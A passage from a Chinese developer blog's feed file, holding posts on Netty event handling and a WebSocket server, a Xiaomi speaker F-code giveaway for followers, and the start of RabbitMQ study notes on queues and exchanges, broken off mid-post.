<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ChannelInboundHandler</span> <span class="keyword">extends</span> <span class="title">ChannelHandler</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">channelRegistered</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">channelUnregistered</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">channelActive</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">channelInactive</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">channelRead</span><span class="params">(ChannelHandlerContext ctx, Object msg)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">channelReadComplete</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">userEventTriggered</span><span class="params">(ChannelHandlerContext ctx, Object evt)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">channelWritabilityChanged</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>自定义Handler时，一般继承ChannelInboundHandlerAdapter或 ChannelOutboundHandlerAdapter。</p>
<p>需要注意的是，不建议在 ChannelHandler 中直接实现耗时或阻塞的操作，因为这可能会阻塞 Netty 工作线程，导致 Netty 无法及时响应 IO 处理。</p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15228569420417.jpg" alt="ChannelPipline"></p>
<h3 id="使用Netty实现Websocket协议"><a href="#使用Netty实现Websocket协议" class="headerlink" title="使用Netty实现Websocket协议"></a>使用Netty实现Websocket协议</h3><h5 id="Websocket协议"><a href="#Websocket协议" class="headerlink" title="Websocket协议"></a>Websocket协议</h5><p>不是本篇的重点，简单说明下：</p>
<ul>
<li>是一种长连接协议，大部分浏览器都支持，通过websocket，服务端可以主动发消息给客户端；</li>
<li>Websocket协议，在握手阶段使用HTTP协议，握手完成之后，走Websocket自己的协议；</li>
<li>Websocket是一种二进制协议；</li>
</ul>
<h5 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h5><p>Netty提供了ChannelInitializer类方便我们初始化，创建WebSocketServerInitializer类，继承ChannelInitializer类，用于添加ChannelHandler：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebSocketServerInitializer</span> <span class="keyword">extends</span> <span class="title">ChannelInitializer</span>&lt;<span class="title">SocketChannel</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Resource</span></span><br><span class="line">	<span class="keyword">private</span> CustomTextFrameHandler customTextFrameHandler;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initChannel</span><span class="params">(SocketChannel ch)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ChannelPipeline pipeline = ch.pipeline();</span><br><span class="line">        pipeline.addLast(<span class="string">"codec-http"</span>, <span class="keyword">new</span> HttpServerCodec());</span><br><span class="line">        pipeline.addLast(<span class="string">"aggregator"</span>, <span class="keyword">new</span> HttpObjectAggregator(<span class="number">65536</span>));</span><br><span class="line">        </span><br><span class="line">        pipeline.addLast(<span class="string">"websocket-protocal-handler"</span>,<span class="keyword">new</span> WebSocketServerProtocolHandler());</span><br><span class="line">        pipeline.addLast(<span class="string">"custome-handler"</span>, customTextFrameHandler);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析下这几个Handler，都是Netty默认提供的：</p>
<ul>
<li>HttpServerCodec：用于解析Http请求，主要在握手阶段进行处理；</li>
<li>HttpObjectAggregator：用于合并Http请求头和请求体，主要在握手阶段进行处理；</li>
<li>WebSocketServerProtocolHandler：处理Websocket协议；</li>
<li>CustomTextFrameHandler：自定义的Handler，用于添加自己的业务逻辑。</li>
</ul>
<p>是不是很方便，经过WebSocketServerProtocolHandler处理后，读取出来的就是文本数据了，不用自己处理数据合包、拆包问题。</p>
<h5 id="CustomTextFrameHandler"><a href="#CustomTextFrameHandler" class="headerlink" title="CustomTextFrameHandler"></a>CustomTextFrameHandler</h5><p>自定义的Handler，进行业务处理：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CustomTextFrameHandler</span> <span class="keyword">extends</span> <span class="title">SimpleChannelInboundHandler</span>&lt;<span class="title">TextWebSocketFrame</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">channelRead0</span><span class="params">(<span class="keyword">final</span> ChannelHandlerContext ctx, TextWebSocketFrame frame)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> String content = frame.text();</span><br><span class="line">        System.out.println(<span class="string">"接收到数据："</span>+content);   </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 回复数据</span></span><br><span class="line">        TextWebSocketFrame respFrame = <span class="keyword">new</span> TextWebSocketFrame(<span class="string">"我收到了你的数据"</span>);</span><br><span class="line">        <span class="keyword">if</span> (ctx.channel().isWritable()) &#123;</span><br><span class="line">		      ChannelFuture future = ctx.writeAndFlush(respFrame);</span><br><span class="line">		  &#125;			        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="福利说明"><a href="#福利说明" class="headerlink" title="福利说明"></a>福利说明</h3><p>最后，说下福利：小爱音箱F码。</p>
<p>准备了2份，主要为了感谢「微信公众号」和「掘金社区」的朋友，每一份包括1个小爱音箱F码和1个小爱音箱 mini F码。</p>
<blockquote>
<p>小米手机F码源自于英文单词”Friend”，是小米公司提供给小米核心用户及为小米做出贡献的网友的优先购买权，如果您有小米F码的话无需等待即可直接利用小米F码购买相关产品！</p>
</blockquote>
<p>简单来说，F码就是不用抢了，可以直接购买 ~ </p>
<h5 id="抽奖截止时间"><a href="#抽奖截止时间" class="headerlink" title="抽奖截止时间"></a>抽奖截止时间</h5><p>4月9号中午12点</p>
<h5 id="抽奖规则"><a href="#抽奖规则" class="headerlink" title="抽奖规则"></a>抽奖规则</h5><h5 id="掘金社区"><a href="#掘金社区" class="headerlink" title="掘金社区"></a>掘金社区</h5><ul>
<li><p>需要关注我的掘金账号才有效，<a href="https://juejin.im/user/565b3a5f00b0bf379f155b39/posts" target="_blank" rel="noopener">个人主页</a>；</p>
</li>
<li><p>使用微信抽奖助手随机抽取for掘金社区；<br><img src="https://user-gold-cdn.xitu.io/2018/4/4/1628c9353e7fa787?w=300&amp;h=469&amp;f=jpeg&amp;s=17236" alt="掘金抽奖"></p>
</li>
</ul>
<h5 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h5><ul>
<li><p>需要关注我的微信公众号才有效；<br><img src="https://user-gold-cdn.xitu.io/2018/4/2/16282238835861ea?w=258&amp;h=258&amp;f=jpeg&amp;s=16282" alt="情情说"></p>
</li>
<li><p>使用微信抽奖助手随机抽取for微信公众号；<br><img src="https://user-gold-cdn.xitu.io/2018/4/4/1628c9354977d20a?w=300&amp;h=470&amp;f=jpeg&amp;s=13425" alt="微信公众号抽奖"></p>
</li>
</ul>
]]></content>
      
        <categories>
            
            <category> Netty </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Netty </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[送福利：小爱音箱F码]]></title>
      <url>https://qqdong.github.io/2018/04/03/%E9%80%81%E7%A6%8F%E5%88%A9%EF%BC%9A%E5%B0%8F%E7%88%B1%E9%9F%B3%E7%AE%B1F%E7%A0%81/</url>
      <content type="html"><![CDATA[<p>一年一度的米粉节活动开始了，活动时间为 4.3 - 4.10，公司给我们发了福利，其中包含4个小爱音箱F码，包括2个小米AI音箱F码，2个小米小爱音箱mini F码，想把这个福利分享给大家，以感谢大家的支持和鼓励。</p>
<p>开始认真写文章有1个半月了，不说有多大的收获，最起码自己的一部分时间很好的利用了，最开心的是让一些朋友有所收货。</p>
<a id="more"></a>
<blockquote>
<p>小米公司是在2010年4月6日成立的。<br>为了感谢米粉们一路以来对小米公司的支持与陪伴，回馈一路支持的粉丝，每年都会在这一天举办粉丝的盛大狂欢，进行对米粉的答谢活动。<br>所以把这一天命名为米粉节！</p>
</blockquote>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15227310135315.jpg?imageView2/2/w/500" alt="掘金社区成就"></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15227310755728.jpg?imageView2/2/w/500" alt="网友的感谢"></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15227311491258.jpg?imageView2/2/w/500" alt="网友的感谢"></p>
<p>会在「微信公众号」和「掘金社区」分别抽奖，分别为1个小爱音箱F码和1个小爱音箱mini F码。</p>
<h4 id="抽奖截止时间"><a href="#抽奖截止时间" class="headerlink" title="抽奖截止时间"></a>抽奖截止时间</h4><p>4月9号中午12点</p>
<h4 id="抽奖规则"><a href="#抽奖规则" class="headerlink" title="抽奖规则"></a>抽奖规则</h4><ul>
<li>需要关注我的微信公众号才有效；</li>
<li>使用微信抽奖助手随机抽取；</li>
</ul>
<p>抽奖链接：<br><img src="http://oc3r3rke2.bkt.clouddn.com/15227319180470.jpg?imageView2/2/w/500" alt=""></p>
<p>公众号：<br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></p>
]]></content>
      
        <categories>
            
            <category> life </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Netty事件监听和处理（上）]]></title>
      <url>https://qqdong.github.io/2018/04/03/Netty%E4%BA%8B%E4%BB%B6%E7%9B%91%E5%90%AC%E5%92%8C%E5%A4%84%E7%90%86%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
      <content type="html"><![CDATA[<p>陪产假结束了，今天又开始正常上班了，正好赶上米粉节活动，又要忙上一阵了，米粉节活动时间为4.03 - 4.10，有不少优惠，感兴趣的可以关注mi.com或小米商城app。</p>
<p>今天给大家送了福利：小爱音箱F码，据说卖的比较好，不太好抢到，借着这次公司福利，分享给大家，以表大家的支持和鼓励。</p>
<p>掘金的运营真的很贴心，主动找到我说：我的福利文章不是技术型文章，不能推送到信息流，只能在个人主页看到，为了让更多的人参与这次抽取，建议写一篇技术文章，末尾加上送福利的内容。再次感谢掘金运营小哥「刺客」的贴心和建议。</p>
<p>RabbitMQ实战的后续章节还没来得及看，这篇就总结下之前在项目组分享过的技术点：Netty事件监听和处理。</p>
<p>通过介绍，你会了解到：</p>
<ul>
<li>事件监听、NIO、线程模型等相关概念；</li>
<li>Netty总体结构；</li>
<li>事件监听和处理；</li>
<li>项目实践总结；</li>
</ul>
<p>本篇先介绍下前两节，下一篇介绍后两节。</p>
<p>本篇最后会说明下福利的抽取规则，大家积极参与 &gt;_&lt;</p>
<a id="more"></a>
<h4 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h4><p>Netty是一个NIO框架，它将IO通道的建立、可读、可写等状态变化，抽象成事件，以责任链的方式进行传递，可以在处理链上插入自定义的Handler，对感兴趣的事件进行监听和处理。</p>
<p>所以，先介绍下事件监听、责任链模型、socket接口和IO模型、线程模型等基本概念，对后面理解Netty的事件监听和处理有很大帮助。</p>
<h5 id="事件监听"><a href="#事件监听" class="headerlink" title="事件监听"></a>事件监听</h5><p>JDK监听器模式主要包含以下元素：</p>
<ul>
<li>EventObject 事件对象</li>
<li>EventListener 事件监听接口</li>
<li>自定义事件源</li>
<li>事件触发</li>
</ul>
<p>模式很简单，用户可以自定义事件源，保存触发对象的相关数据，事件被触发后，传递给注册事件的处理者。事件监听接口是为了统一处理者方法。</p>
<p>举个比较好理解的按钮单击事件，其中ActionListener是事件监听器，ActionEvent是事件对象，包含了事件源：<br><img src="http://oc3r3rke2.bkt.clouddn.com/15227711152530.jpg" alt=""></p>
<p>实现一套事件监听的具体过程：</p>
<ul>
<li>确定事件源；</li>
<li>明确可能产生的事件，定义成不同的事件对象或事件方法；</li>
<li>提供一个存储结构，用于保存监听事件的对象，当事件发生时，会通知监听者；</li>
<li>执行回调方法，进行业务处理；</li>
</ul>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15227717160721.jpg" alt="事件监听"></p>
<h5 id="责任链模式"><a href="#责任链模式" class="headerlink" title="责任链模式"></a>责任链模式</h5><p>主要是说事件处理者的组织方式，通过责任链模式，可以在任何处理节点，添加自定义处理器，很方便。</p>
<p>关于责任链概念，这里再简单说下：使多个对象都有机会处理请求，从而避免请求的发送者和接受者之间的耦合关系，将这个对象连成一条链，并沿着这条链传递该请求，直到有一个对象处理他为止。</p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15227720369026.jpg" alt="责任链模式"></p>
<h5 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h5><p>一般说NIO，主要是针对网络IO，从网卡中读取数据，向网卡中写入数据，这就是监听器模式的数据源。</p>
<p>网络编程主要通过操作系统提供的socket接口进行，通过了解socket接口可以总结出有哪些事件。</p>
<blockquote>
<p>socket是用户进程和内核网络协议之间的统一接口。<br>socket也是一种特殊的文件，网络通信可以看作是对文件的读取，使得对网络的控制和对文件的控制一样方便。</p>
</blockquote>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15227728223237.jpg" alt="sokcet接口"></p>
<h5 id="NIO和IO模型"><a href="#NIO和IO模型" class="headerlink" title="NIO和IO模型"></a>NIO和IO模型</h5><p>NIO是指非阻塞IO，我们一般说的IO都是阻塞IO，想全面了解这些概念，又会说的很多，这里就简单概括下。</p>
<p>一个进程所占的内存包括用户态和内核态，为了安全，用户代码是不能直接操作内核态内存的，通过系统调用进行交互，比如读取网络数据，交互过程如下：</p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15227734277894.jpg" alt="同步阻塞"></p>
<p>用户线程发起read请求后，需要等待数据到达才能返回，在这期间，用户线程不能做任何事情，如果是网络编程，可能有很多Socket对象进行监听，会创建大量线程被阻塞，造成资源浪费，性能下降。</p>
<p>针对这种情况，出现了IO模型的概念，有几种方式：</p>
<ul>
<li>同步非阻塞IO；</li>
<li>IO多路复用；</li>
<li>异步IO；</li>
</ul>
<p>具体介绍，网上有很多资料，就不详细说了，这里只提下IO多路复用，说说我的理解，我们项目中就是使用这种方式。</p>
<p>所谓多路复用，主要是操作系统提供给我们这种开发模式：可以把感兴趣的IO事件（建立、可读、可写等）提前注册，而且多个socket对象可以注册到一个selector选择器上，这样就可以多个socket对象使用一个用户线程进行监听，当事件发生时，会查找对应的socket进行读、写等操作。</p>
<p>之前做过NIO开发的朋友，可以看下面的示例回顾下整个过程：</p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15227745977153.jpg" alt="java NIO示例"></p>
<h5 id="线程模型"><a href="#线程模型" class="headerlink" title="线程模型"></a>线程模型</h5><p>上面说了我对多路复用的理解，提到了一个线程监听多个socket，但如果socket很多，一个线程是处理不过来的。另外，事件的接收和判断 与 数据的读取、处理、写入，可以在不同线程进行。</p>
<p>这就引出了线程模型的概念，比如Reactor和Proactor模型，具体细节就不介绍了，网上有很多资料，最终目的都是为了提高IO事件处理的性能。</p>
<h4 id="Netty总体结构"><a href="#Netty总体结构" class="headerlink" title="Netty总体结构"></a>Netty总体结构</h4><p>这部分主要是了解下Netty，对其实现原理先不做深究。</p>
<h5 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h5><blockquote>
<p>Netty 是一个异步的事件驱动的网络应用程序框架，支持快速地开发可维护的高性能的面向协议的服务器和客户端;<br>它驾驭了 Java 高级 API 的能力，并将其隐藏在一个易于使用的 API 之后;</p>
</blockquote>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15227751850367.jpg" alt="Netty总体结构"></p>
<ul>
<li>Core（核心部分），是底层的网络通讯的一些通用抽象，这部分内容是关键。</li>
<li>Transport Services（传输服务），具体的网络传输能力的定义以及一些实现。</li>
<li>Protocol Support（协议支持），netty 对于一些通用协议的编码解码实现。</li>
</ul>
<h5 id="零拷贝"><a href="#零拷贝" class="headerlink" title="零拷贝"></a>零拷贝</h5><p>广义的零拷贝是指计算机操作的过程中，CPU不需要为数据在内存之间的拷贝消耗资源。Linux中的sendfile()以及 Java NIO 中的FileChannel.transferTo()方法都实现了零拷贝的功能，而在 Netty 中也通过在FileRegion中包装了 NIO 的FileChannel.transferTo()方法实现了零拷贝。</p>
<p>Netty中所指零拷贝，完全在用户态，更偏向于优化数据操作。Netty允许我们将多段数据合并为一整段虚拟数据供用户使用，而不需要对数据进行拷贝操作。</p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15227756611645.jpg" alt="Netty零拷贝"></p>
<h5 id="统一的通讯模型"><a href="#统一的通讯模型" class="headerlink" title="统一的通讯模型"></a>统一的通讯模型</h5><p>传统的JAVA IO API 在应对不同的传输协议时，需要使用不同的类型和方法，例如：java.net.Socket和java.net.DatagramSocket，它们并不具有相同的超类型；Java新的IO API与原有的阻塞式IO API也不兼容；</p>
<p>Netty提供了统一的API编程接口，抽象了所有点对点通信操作，仅调整几行代码，便可切换不同的传输实现：</p>
<ul>
<li>基于NIO的TCP/IP传输</li>
<li>基于OIO的TCP/IP传输</li>
<li>基于OIO的UDP/IP传输</li>
<li>本地传输</li>
</ul>
<h5 id="事件模型"><a href="#事件模型" class="headerlink" title="事件模型"></a>事件模型</h5><p>也就是要说的事件监听和处理，提供了很好的方式去处理各种事件。</p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15227759430516.jpg" alt="Netty事件模型"></p>
<p>大致处理过程如上图，具体将在下一篇介绍。</p>
<hr>
<h4 id="福利说明"><a href="#福利说明" class="headerlink" title="福利说明"></a>福利说明</h4><p>最后，说下福利：小爱音箱F码。</p>
<p>准备了2份，主要为了感谢「微信公众号」和「掘金社区」的朋友，每一份包括1个小爱音箱F码和1个小爱音箱 mini F码。</p>
<blockquote>
<p>小米手机F码源自于英文单词”Friend”，是小米公司提供给小米核心用户及为小米做出贡献的网友的优先购买权，如果您有小米F码的话无需等待即可直接利用小米F码购买相关产品！</p>
</blockquote>
<p>简单来说，F码就是不用抢了，可以直接购买 ~ </p>
<h5 id="抽奖截止时间"><a href="#抽奖截止时间" class="headerlink" title="抽奖截止时间"></a>抽奖截止时间</h5><p>4月9号中午12点</p>
<h5 id="抽奖规则"><a href="#抽奖规则" class="headerlink" title="抽奖规则"></a>抽奖规则</h5><h5 id="掘金社区"><a href="#掘金社区" class="headerlink" title="掘金社区"></a>掘金社区</h5><ul>
<li><p>需要关注我的掘金账号才有效，<a href="https://juejin.im/user/565b3a5f00b0bf379f155b39/posts" target="_blank" rel="noopener">个人主页</a>；</p>
</li>
<li><p>使用微信抽奖助手随机抽取for掘金社区；<br><img src="https://user-gold-cdn.xitu.io/2018/4/4/1628c9353e7fa787?w=300&amp;h=469&amp;f=jpeg&amp;s=17236" alt="掘金抽奖"></p>
</li>
</ul>
<h5 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h5><ul>
<li><p>需要关注我的微信公众号才有效；<br><img src="https://user-gold-cdn.xitu.io/2018/4/2/16282238835861ea?w=258&amp;h=258&amp;f=jpeg&amp;s=16282" alt="情情说"></p>
</li>
<li><p>使用微信抽奖助手随机抽取for微信公众号；<br><img src="https://user-gold-cdn.xitu.io/2018/4/4/1628c9354977d20a?w=300&amp;h=470&amp;f=jpeg&amp;s=13425" alt="微信公众号抽奖"></p>
</li>
</ul>
]]></content>
      
        <categories>
            
            <category> Netty </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Netty </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[RabbitMQ实战：理解消息通信]]></title>
      <url>https://qqdong.github.io/2018/04/01/RabbitMQ%E5%AE%9E%E6%88%98%EF%BC%9A%E7%90%86%E8%A7%A3%E6%B6%88%E6%81%AF%E9%80%9A%E4%BF%A1/</url>
      <content type="html"><![CDATA[<blockquote>
<p>本系列是「RabbitMQ实战：高效部署分布式消息队列」书籍的总结笔记。</p>
</blockquote>
<p>前段时间总结完了「深入浅出MyBatis」系列，对MyBatis有了更全面和深入的了解，在掘金社区也收到了一些博友的喜欢，很高兴。另外，短暂的陪产假就要结束了，小宝也二周了，下周二就要投入工作了，希望自己尽快调整过来，加油努力。</p>
<p>从本篇开始总结「RabbitMQ实战」系列的阅读笔记，RabbitMQ是一个开源的消息代理和队列服务器，可以通过基本协议在完全不同的应用之间共享数据，可以将作业排队以便让分布式服务进行处理。</p>
<p>本篇介绍下消息通信，首先介绍基础概念，将这些概念映射到AMQP协议，然后介绍消息持久化、发送方确认模式等消息可靠性保证。</p>
<p>通过本篇介绍，你会了解到：</p>
<ul>
<li>消息通信概念：消费者、生产者和代理</li>
<li>AMQP元素：队列、交换器、绑定</li>
<li>虚拟主机</li>
<li>消息持久化</li>
<li>发送方确认模式</li>
</ul>
<a id="more"></a>
<h4 id="消息通信概念"><a href="#消息通信概念" class="headerlink" title="消息通信概念"></a>消息通信概念</h4><p>此部分的介绍，会牵涉到AMQP的元素，如果之前没接触过的，可以结合下面的「AMQP元素」进行理解。</p>
<h5 id="消息"><a href="#消息" class="headerlink" title="消息"></a>消息</h5><p>消息是传输的主体，消息包括两部分：有效载荷（payload）和标签（label）；有效载荷是要传输的数据，可以是任何内容，比如JSON串、二进制、自定义的数据协议等；标签描述了有效载荷，并且Rabbit用它来决定谁将获得消息的投递。</p>
<p>可以与HTTP协议类比，HTTP消息头部描述了消息体的类型、大小等，HTTP消息体是要传输的数据，HTTP服务端通过消息头部决定如何处理请求和数据。</p>
<h5 id="生产者和消费者"><a href="#生产者和消费者" class="headerlink" title="生产者和消费者"></a>生产者和消费者</h5><p>生产者创建消息，然后发送到代理服务器（RabbitMQ Server），AMQP只会用标签表述这条消息（一个交换器名称和可选的主题标记），Rabbit服务器会根据标签把消息发送给订阅的消费者。</p>
<p>消费者消费消息，它会订阅到队列（queue）上，每当有消息到达RabbitMQ服务器时，会发送给消费者，消费者收到消息时，会进行处理。</p>
<p>注意：消费者收到的消息只包括有效载荷，所有不会知道是从哪里发来的。</p>
<h5 id="连接和信道"><a href="#连接和信道" class="headerlink" title="连接和信道"></a>连接和信道</h5><p>要想发布或消费消息，必须先与RabbitMQ Server建立一条TCP连接，建立TCP连接之后，要创建一条信道，信道是建立在真实TCP连接的虚拟连接。</p>
<p>AMQP命令都是通过信道发送出去的，每条信道会被指派一个唯一的ID，为什么不直接通过TCP连接发送AMQP命令呢？ 因为操作系统建立和销毁TCP会话是很昂贵的，而且创建的连接数也有限。  通过引入通道，可以在连接上建立通道，而且通道是私密的，相互不受影响。</p>
<blockquote>
<p>通道的概念还是有点抽象，后面专门写一篇文章进行分析介绍，这里简单理解下吧。</p>
</blockquote>
<h4 id="AMQP元素"><a href="#AMQP元素" class="headerlink" title="AMQP元素"></a>AMQP元素</h4><p>AMQP消息路由有三部分组成：队列、交换器和绑定，队列是存放消息的地方，交换器是决定不同的分发策略，绑定是队列和交换器的桥梁，定义匹配规则。</p>
<p>生产者发送消息到交换器，交换器根据自身类型和绑定规则，将消息存放在对应队列中，然后将消息发送到监听队列的消费者。</p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15225938296495.jpg" alt="AMQP基本模型"></p>
<p>如上图：P为生产者，X为交换器，交换器类型为direct，根据不同的绑定规则(orange、black、green)，分发给不同的队列，C为消费者，从不同的队列介绍消息。</p>
<h5 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h5><p>消费者通过两种方式从特定的队列接收消息：</p>
<ul>
<li>basic.consume，这样会将信道置为接收模式，直到取消对队列的订阅；</li>
<li>basic.get，主动让消费者接收队列中的下一条消息；</li>
</ul>
<p>basic.get会影响性能，推荐使用basic.consume来实现高吞吐量，因为其处理过程是先订阅消息，获取单条消息，再取取消订阅。</p>
<p>如果队列拥有多个消费者时，队列收到的消息将以循环的方式发给消费者，即多个消费者平均消费这些消息。</p>
<p>另外，消费者接收到的每一条消息都要进行确认，必须通过basic.ack命令向rabbitmq服务端发送一个确认。 也可以设置auto_ack为true，只要消费者接收到消息，就自动视为确认，不过不建议这样，因为接收到不代表业务逻辑处理成功。 服务端接收到确认后，会从队列中删除对应消息。</p>
<p>还有一种场景，在接收到消息后，如果不想处理，可以通过下面方式处理：</p>
<ul>
<li>把消费者从RabbitMQ服务器断开连接，，这样RabbitMQ会自动将消息入队并发送给另外一个消费者；</li>
<li>如果不想发送给其他消费者处理，就是想忽略这个消息，可以发送basic.reject命令；</li>
</ul>
<p>最后来介绍下如何创建队列，首先明确下是生成者还是消费者创建，关键点是：生产者能否承担起丢失消息，因为发出去的消息如果路由到了不存在的队列，Rabbit会忽略它们。所以，建议生成者和消费者都尝试去创建队列，可以通过设置queue.declare的passive选项设置为ture来判断队列是否存在，如果不存在会返回一个错误。</p>
<p>通过queue.declare命令来创建队列，有一些选项说明下：</p>
<ul>
<li>exclusive：如果设置true的化，队列将变成私有的，只有创建队列的应用程序才能够消费队列消息；</li>
<li>auto-delete：当最后一个消费者取消订阅的时候，队列会自动移除；</li>
<li>durable：是否要持久化；</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">queueDeclare(String queue, </span><br><span class="line">            <span class="keyword">boolean</span> durable, </span><br><span class="line">            <span class="keyword">boolean</span> exclusive, </span><br><span class="line">            Map&lt;String, Object&gt; arguments);</span><br></pre></td></tr></table></figure>
<h5 id="交换器和绑定"><a href="#交换器和绑定" class="headerlink" title="交换器和绑定"></a>交换器和绑定</h5><p>交换器有四种类型：direct、fanout、topic、headers，其中headers匹配消息的header而非路由键，不太实用，就不详细介绍了。</p>
<p>第一种：direct交换器</p>
<p>direct交换器比较简单，如果和路由键 <strong>完全匹配</strong> 的话，就会投递到对应的队列：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">channel.exchangeDeclare(EXCHANGE_NAME, &quot;direct&quot;);</span><br><span class="line">channel.queueBind(queueName, EXCHANGE_NAME, routingKey);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>服务器默认包含一个空白字符串名称的默认路由器，当声明一个队列时，会自定绑定到默认交换器，并以队列名称作为路由键。</p>
</blockquote>
<p>第二种：fanout交换器</p>
<p>fanout交换器，不处理路由键，只需要简单的将队列绑定到交换机上，为会每个消费者自动生成一个随机队列，所有的消费者都会收到所有消息。</p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15225973012952.jpg" alt="fanout交换器"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">channel.exchangeDeclare(EXCHANGE_NAME, &quot;fanout&quot;);</span><br></pre></td></tr></table></figure>
<p>第三种：topic交换器</p>
<p>topic交换器，将路由键和某模式进行匹配，此时队列需要绑定要一个模式上。</p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15225976344263.jpg" alt="tipic交换器"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">channel.exchangeDeclare(EXCHANGE_NAME, <span class="string">"topic"</span>);</span><br><span class="line">channel.queueBind(queueName, EXCHANGE_NAME, <span class="string">"*.orange.*"</span>);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>关于模式，符号#匹配一个或多个词，符号<em>匹配一个词，因此kfs.#能够匹配到kfs.session.message，但是audit.</em>只会匹配到audit.session。</p>
</blockquote>
